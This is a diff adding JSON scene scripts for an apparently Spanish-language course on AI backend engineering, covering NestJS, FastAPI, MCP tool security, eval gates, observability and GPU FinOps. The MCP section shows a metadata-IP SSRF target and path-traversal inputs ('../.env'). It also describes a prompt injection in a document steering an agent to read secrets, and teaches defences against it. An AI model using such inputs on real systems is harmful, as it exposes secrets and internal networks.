+              "blocked": true
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Capa Limpia",
+        "title": "Zod en la Frontera, Identidad en Guards y Controllers Delgados",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "blue",
+        "durationSec": 9,
+        "speech": "Aceptar tenant_id desde el body HTTP. La identidad y los roles deben nacer únicamente del AuthGuard verificado, mientras un ZodValidationPipe acota longitudes y esquemas antes del controlador.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "ask-question.controller.ts",
+          "before": [
+            "return service.ask(body.tenantId, body.prompt); // ❌ IDOR + acoplado"
+          ],
+          "after": [
+            "@UseGuards(JwtAuthGuard) ask(@TenantCtx() ctx, @Body(AskZodPipe) dto) {",
+            "  return this.askUseCase.execute(ctx, dto); // delegado a puertos DDD"
+          ],
+          "callout": "Controller sin lógica SQL ni llamadas directas a OpenAI."
+        }
+      },
+      {
+        "chapter": "03 · Presupuesto",
+        "title": "¿Cómo Evitamos Sobregiros y Bloqueos al Emitir Tokens por SSE?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "violet",
+        "durationSec": 4,
+        "speech": "¿Y qué puertos protegen el gasto y el streaming en respuestas largas?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "HEXAGONAL NESTJS PORTS",
+          "laneA": {
+            "name": "Pre-Vuelo",
+            "steps": [
+              "ZodSchema.parse()",
+              "BudgetAuthorizer.reserve()",
+              "KnowledgeRetriever"
+            ]
+          },
+          "laneB": {
+            "name": "Streaming",
+            "steps": [
+              "AbortSignal on close",
+              "SSE Frame Tipado",
+              "Reconcile ledger"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Arquitectura DDD",
+        "title": "BudgetAuthorizer, AbortSignal en SSE y Reconciliación Final",
+        "speaker": "axon",
+        "mascot": "coding",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Inyectas los puertos KnowledgeRetriever y BudgetAuthorizer, propagas AbortSignal si el cliente cierra el stream SSE, y concilias los tokens reales al finalizar.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F03 · nestjs-ai-backend",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": ">",
+              "text": "Guards -> ZodPipe -> BudgetPort -> Domain -> Ports",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Zero IDOR · Clean SSE AbortSignal · 100% Swappable LLM",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f04",
+    "aliases": [
+      "F04"
+    ],
+    "filename": "f04.mp3",
+    "kicker": "FRAMEWORK F04 · FASTAPI & INGESTA",
+    "heading": "Python FastAPI, Pydantic v2, Ingesta Idempotente y Reranking",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F04/1",
+    "scenes": [
+      {
+        "chapter": "01 · Event Loop Bloqueado",
+        "title": "Por qué un Reranker Síncrono Congela Todo FastAPI",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 7,
+        "speech": "En F04 trabajamos con Python y FastAPI. ¿Qué ocurre cuando ejecutamos embeddings o reranking pesado dentro de una ruta asíncrona?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "async def endpoint()",
+              "sub": "Event loop único",
+              "state": "normal"
+            },
+            {
+              "label": "CrossEncoder CPU",
+              "sub": "Bloquea 450 ms",
+              "state": "hot"
+            },
+            {
+              "label": "Healthcheck / P99",
+              "sub": "Todas las rutas congeladas",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Impacto en Event Loop Asyncio",
+          "metricBefore": "Saludable",
+          "metricAfter": "Starvation Total"
+        }
+      },
+      {
+        "chapter": "02 · Pydantic & Hash",
+        "title": "Contratos Strict con extra='forbid' e Ingesta Idempotente SHA-256",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Bloqueas el event loop y tumbas tus propios healthchecks. Por eso combinamos Pydantic v2 con extra='forbid', workers aislados para CPU e ingesta idempotente mediante hash SHA-256.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "ingest_service.py",
+          "before": [
+            "doc = await parse_and_rerank_sync(file) # ❌ bloquea loop y duplica"
+          ],
+          "after": [
+            "key = hashlib.sha256(f'{tenant}:{doc_id}:{raw}'.encode()).hexdigest()",
+            "scores = await asyncio.to_thread(reranker.score, top_30_candidates)"
+          ],
+          "callout": "Reindexar el mismo documento jamás debe duplicar chunks ni bloquear requests."
+        }
+      },
+      {
+        "chapter": "03 · Presupuesto Rerank",
+        "title": "¿Cuántos Chunks Evaluamos y Cómo Testeamos Sin GPU Real?",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y cómo mantenemos los tests de CI rápidos y deterministas sin llamar APIs externas?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "FASTAPI CLEAN ADAPTERS",
+          "laneA": {
+            "name": "Runtime",
+            "steps": [
+              "Pydantic extra=forbid",
+              "Workers to_thread()",
+              "Rerank <= top-30"
+            ]
+          },
+          "laneB": {
+            "name": "CI Testing",
+            "steps": [
+              "Protocol Interfaces",
+              "Fakes Deterministas",
+              "Unittest < 50 ms"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Microservicio Sólido",
+        "title": "Adaptadores Intercambiables y Suite Unittest Ultrarrápida",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Definiendo protocolos abstractos para embeddings y reranking, inyectando fakes deterministas en unittest y acotando el reranking siempre a los top treinta candidatos.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F04 · fastapi-rag-worker",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "python -m unittest discover -s tests -v",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ SHA-256 idempotency OK · Non-blocking async OK · 0.01s",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f05",
+    "aliases": [
+      "F05"
+    ],
+    "filename": "f05.mp3",
+    "kicker": "FRAMEWORK F05 · MCP & SECURITY",
+    "heading": "MCP (Model Context Protocol) & Tool Security en Empresa",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F05/1",
+    "scenes": [
+      {
+        "chapter": "01 · El Puerto Estándar",
+        "title": "MCP No Es Solo Conectar Tools, Es Governar Permisos",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 7,
+        "speech": "En F05 entramos al protocolo MCP para conectar modelos con herramientas internas. ¿Qué falla cuando exponemos recursos sin barreras?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Tool Fetch URL",
+              "sub": "http://169.254.169.254",
+              "state": "hot"
+            },
+            {
+              "label": "Tool Read File",
+              "sub": "../../secrets.json",
+              "state": "hot"
+            },
+            {
+              "label": "Audit Log",
+              "sub": "Vacío ❌",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Superficie de Ataque MCP Sin Sandbox",
+          "metricBefore": "Productividad rápida",
+          "metricAfter": "SSRF + Traversal + Abuso"
+        }
+      },
+      {
+        "chapter": "02 · Defensa Estricta",
+        "title": "Contratos Zod, Sandbox de Rutas y Bloqueo SSRF",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Que una inyección en un documento podría inducir al agente a leer rutas padre o hacer SSRF a tu red interna. Cada tool MCP necesita esquema estricto, sandbox de rutas y allowlist de red.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "mcp-tool-guard.ts",
+          "before": [
+            "server.tool('fetch', ({ url }) => fetch(url)) // ❌ SSRF total"
+          ],
+          "after": [
+            "const safeUrl = assertAllowlistedHttpsHost(input.url);",
+            "const safePath = assertInsideBaseDir(BASE_DOCS, input.path);"
+          ],
+          "callout": "Rechaza IPs privadas, esquema file://, DNS rebinding y traversal."
+        }
+      },
+      {
+        "chapter": "03 · Trazabilidad",
+        "title": "¿Cómo Auditamos Quién Ejecutó Qué Herramienta?",
+        "speaker": "host",
+        "mascot": "reading",
+        "aura": "gold",
+        "durationSec": 4,
+        "speech": "¿Y cómo registramos cada ejecución sin guardar secretos en los logs?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "ENTERPRISE MCP SECURITY",
+          "laneA": {
+            "name": "Autorización",
+            "steps": [
+              "Tenant + User Scope",
+              "Tool Allowlist",
+              "HITL si Mutación"
+            ]
+          },
+          "laneB": {
+            "name": "Auditoría",
+            "steps": [
+              "actor_id + tool_name",
+              "Args Redactados",
+              "Outcome + trace_id"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · MCP Seguro",
+        "title": "Autorización por Ejecución, Timeouts y Bitácora Firmada",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Autorizando por usuario en cada invocación, aplicando timeout duro de red, exigiendo confirmación HITL en escrituras y registrando actor, tool y resultado con argumentos redactados.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F05 · enterprise-mcp-server",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "invoke_mcp(actor='u_22', tool='read_doc', path='../.env')",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ 403 Forbidden: Path traversal & non-allowlisted target blocked",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f06",
+    "aliases": [
+      "F06"
+    ],
+    "filename": "f06.mp3",
+    "kicker": "FRAMEWORK F06 · RAGAS & EVALS",
+    "heading": "Ragas, Golden Datasets y CI Regression Gates Antes de Merge",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F06/1",
+    "scenes": [
+      {
+        "chapter": "01 · El Efecto Topo",
+        "title": "Ajustas un Prompt y Rompes Otros Diez Casos Sin Saberlo",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 7,
+        "speech": "En F06 automatizamos Evals continuos. ¿Cómo evitamos que mejorar una pregunta en el prompt rompa silenciosamente otras veinte?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "incident",
+          "nodes": [
+            {
+              "label": "Cambio Chunking",
+              "sub": "512 -> 256 tokens",
+              "state": "normal"
+            },
+            {
+              "label": "Vibe-Check Manual",
+              "sub": "Solo 3 pruebas",
+              "state": "hot"
+            },
+            {
+              "label": "Regresión Oculta",
+              "sub": "Recall -18% en prod",
+              "state": "hot"
+            }
+          ],
+          "metricLabel": "Despliegues Sin Golden Set",
+          "metricBefore": "Vibe Check",
+          "metricAfter": "Ceguera de Calidad"
+        }
+      },
+      {
+        "chapter": "02 · Tres Métricas",
+        "title": "Separar Recuperación (Recall@K / nDCG) de Fidelidad (Faithfulness)",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Abandonando el vibe-checking por un Golden Dataset versionado en CI. Mides Recall@K y nDCG en el retriever por separado del Faithfulness y tasa de citas válidas en el generador.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "ci-ragas-gate.py",
+          "before": [
+            "assert len(response) > 20 # ❌ no mide relevancia ni soporte"
+          ],
+          "after": [
+            "assert eval_report.recall_at_5 >= 0.90",
+            "assert eval_report.faithfulness >= 0.92 and eval_report.fabricated_cites == 0"
+          ],
+          "callout": "Si falla el retriever ajustas chunking/RRF; si falla fidelidad ajustas el prompt."
+        }
+      },
+      {
+        "chapter": "03 · Casos Negativos",
+        "title": "¿Qué Debe Medir Sí o Sí un Buen Golden Dataset?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y por qué es obligatorio incluir preguntas cuya respuesta NO está en el corpus?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "GOLDEN SET · ZERO SILENT REGRESSION",
+          "laneA": {
+            "name": "Retriever Gate",
+            "steps": [
+              "Recall@K >= 0.90",
+              "nDCG ordenación",
+              "ACL Cross-Tenant"
+            ]
+          },
+          "laneB": {
+            "name": "Generator Gate",
+            "steps": [
+              "Faithfulness",
+              "Citas Verificadas",
+              "Abstención Correcta"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "04 · Gate de CI",
+        "title": "Bloqueo Automático de Merge Cuando Caen las Métricas",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Para probar que tu sistema sabe abstenerse cuando falta evidencia y no alucina. Si cualquier métrica cae debajo del umbral en el pull request, el CI bloquea el merge automáticamente.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F06 · ragas-ci-gate",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "run_golden_evals --dataset v4 --threshold 0.90",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Recall@5=0.95 · nDCG=0.91 · Faithfulness=0.94 · Abstention=100%",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f07",
+    "aliases": [
+      "F07"
+    ],
+    "filename": "f07.mp3",
+    "kicker": "FRAMEWORK F07 · OTEL & LANGFUSE",
+    "heading": "OpenTelemetry GenAI, Langfuse & Arize Phoenix Sin Fugas PII",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F07/1",
+    "scenes": [
+      {
+        "chapter": "01 · Caja Negra",
+        "title": "Sin Trazas Distribuidas, Cada Error de Agente Es un Misterio",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 7,
+        "speech": "En F07 instrumentamos observabilidad GenAI con OpenTelemetry, Langfuse y Phoenix. ¿Por qué no bastan los logs de texto planos en sistemas de IA?",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "distributed-ai-trace",
+          "badge": "TRACE TREE",
+          "lines": [
+            {
+              "prompt": "├─",
+              "text": "span: retriever.hybrid_rrf   (34 ms · chunks=6)",
+              "tone": "ok"
+            },
+            {
+              "prompt": "├─",
+              "text": "span: reranker.cross_encoder (92 ms · top=6)",
+              "tone": "ok"
+            },
+            {
+              "prompt": "└─",
+              "text": "span: llm.generate (980 ms · tokens=640 · cost=$0.0012)",
+              "tone": "warn"
+            }
+          ]
+        }
+      },
+      {
+        "chapter": "02 · Correlación",
+        "title": "Árbol de Spans con Latencia, Costo y Versión de Prompt",
+        "speaker": "axon",
+        "mascot": "architecture",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Porque necesitas ver el árbol completo por petición: cuánto tardó pgvector, cuánto el reranker, qué versión de prompt respondió y qué costo tuvo esa traza en tokens.",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "bounded",
+          "statusBadge": "CONVENCIONES SEMÁNTICAS GENAI",
+          "laneA": {
+            "name": "Métricas Span",
+            "steps": [
+              "gen_ai.system",
+              "tokens_in / out",
+              "prompt_version"
+            ]
+          },
+          "laneB": {
+            "name": "Privacidad",
+            "steps": [
+              "Scrubber Pre-Export",
+              "0% DNI/Email",
+              "0% Bearer Keys"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "03 · Limpieza PII",
+        "title": "¿Cómo Evitamos Convertir las Trazas en una Brecha Legal?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "gold",
+        "durationSec": 4,
+        "speech": "¿Y qué atributo nunca debe salir sin redactar hacia el collector externo?",
+        "visual": {
+          "kind": "code-diff",
+          "file": "otel-sanitizer.ts",
+          "before": [
+            "span.setAttribute('gen_ai.prompt', rawUserPrompt); // ❌ PII cruda"
+          ],
+          "after": [
+            "span.setAttributes({ 'app.prompt_sha256': hash, 'gen_ai.usage.input_tokens': n });",
+            "// + Scrub regex para tokens Bearer, correos y teléfonos"
+          ],
+          "callout": "Métricas operativas al 100%, datos personales al 0%."
+        }
+      },
+      {
+        "chapter": "04 · Alertas SLO",
+        "title": "Dashboards por Tenant, Deriva de Costo y Redacción Segura",
+        "speaker": "axon",
+        "mascot": "senior",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Nunca exportes prompts con datos personales ni encabezados secretos. Usa OpenTelemetry con redacción determinista y alertas automáticas cuando suba el p99 o el costo por usuario.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F07 · genai-observability",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "export_trace(trace_id='tr_91', redact_pii=True)",
+              "tone": "cmd"
+            },
+            {
+              "text": "✓ Langfuse & Phoenix spans exported · PII Leaks: 0",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  },
+  {
+    "id": "f08",
+    "aliases": [
+      "F08"
+    ],
+    "filename": "f08.mp3",
+    "kicker": "FRAMEWORK F08 · VLLM & FINOPS",
+    "heading": "Ollama / vLLM Serving & Atomic FinOps Gateway en Producción",
+    "ctaLabel": "Practicar Unidad 1",
+    "ctaHref": "#/frameworks/F08/1",
+    "scenes": [
+      {
+        "chapter": "01 · Reserva vs Lectura",
+        "title": "Por qué Chequear el Saldo Antes de Llamar No Basta",
+        "speaker": "host",
+        "mascot": "debug",
+        "aura": "gold",
+        "durationSec": 7,
+        "speech": "Cerramos con F08: despliegue GPU con vLLM y FinOps atómico. ¿Por qué leer el presupuesto disponible antes de enviar requests concurriendo sigue causando sobregasto?",
+        "visual": {
+          "kind": "agent-lanes",
+          "mode": "storm",
+          "statusBadge": "RACE CONDITION EN FINOPS",
+          "laneA": {
+            "name": "Check Ingenuo",
+            "steps": [
+              "Req A lee $1.00",
+              "Req B lee $1.00",
+              "Ambas gastan $0.80"
+            ]
+          },
+          "laneB": {
+            "name": "Saldo Final",
+            "steps": [
+              "Sobregiro -$0.60 ❌",
+              "VRAM saturada",
+              "Sin conciliación"
+            ]
+          }
+        }
+      },
+      {
+        "chapter": "02 · Ledger Atómico",
+        "title": "Reserva Optimista Atómica y Reconciliación del Sobrante",
+        "speaker": "axon",
+        "mascot": "idea",
+        "aura": "violet",
+        "durationSec": 9,
+        "speech": "Por condiciones de carrera. Cincuenta peticiones concurrentes leen el mismo saldo al mismo tiempo. Necesitas una reserva atómica por peor escenario antes de inferir, y luego devolver los tokens no usados.",
+        "visual": {
+          "kind": "code-diff",
+          "file": "finops-gateway.ts",
+          "before": [
+            "if (balance >= est) await callLLM(); balance -= real; // ❌ race condition"
+          ],
+          "after": [
+            "const tx = await ledger.reserveAtomic(tenantId, maxWorstCaseCost);",
+            "try { ... } finally { await ledger.reconcile(tx, actualTokenCost); }"
+          ],
+          "callout": "Reserve-Commit-Refund atómico en PostgreSQL o Lua script en Redis."
+        }
+      },
+      {
+        "chapter": "03 · Serving Local",
+        "title": "¿Cómo Blindamos Nodos vLLM o Ollama Propios?",
+        "speaker": "host",
+        "mascot": "question",
+        "aura": "blue",
+        "durationSec": 4,
+        "speech": "¿Y qué controles necesita el servidor vLLM detrás de ese gateway FinOps?",
+        "visual": {
+          "kind": "prompt-shield",
+          "mode": "mitigated",
+          "nodes": [
+            {
+              "label": "Auth & TLS",
+              "sub": "Token por servicio",
+              "state": "ok"
+            },
+            {
+              "label": "KV Cache Guard",
+              "sub": "max_num_seqs acotado",
+              "state": "ok"
+            },
+            {
+              "label": "ACL Cache",
+              "sub": "Reutiliza solo autorizado",
+              "state": "ok"
+            }
+          ],
+          "metricLabel": "Economía & Resiliencia GPU",
+          "metricBefore": "OOM + Sobregasto",
+          "metricAfter": "0% OOM · Cap Exacto"
+        }
+      },
+      {
+        "chapter": "04 · Arquitectura Completa",
+        "title": "Caché Segregado por ACL, Limites KV y Presupuesto Garantizado",
+        "speaker": "axon",
+        "mascot": "celebrate",
+        "aura": "emerald",
+        "durationSec": 9,
+        "speech": "Autenticación interna estricta, control de concurrencia para proteger la KV Cache contra OOM y caché segregado por ACL para reducir costo sin sacrificar privacidad.",
+        "visual": {
+          "kind": "finops-terminal",
+          "title": "F08 · vllm-finops-gateway",
+          "badge": "5 UNITS",
+          "lines": [
+            {
+              "prompt": "$",
+              "text": "atomic_reserve(100_concurrent, cap=10.00) -> 0 overspend",
+              "tone": "ok"
+            },
+            {
+              "text": "✓ Unused tokens refunded · GPU VRAM protected · PASS",
+              "tone": "ok"
+            }
+          ]
+        }
+      }
+    ]
+  }
+]
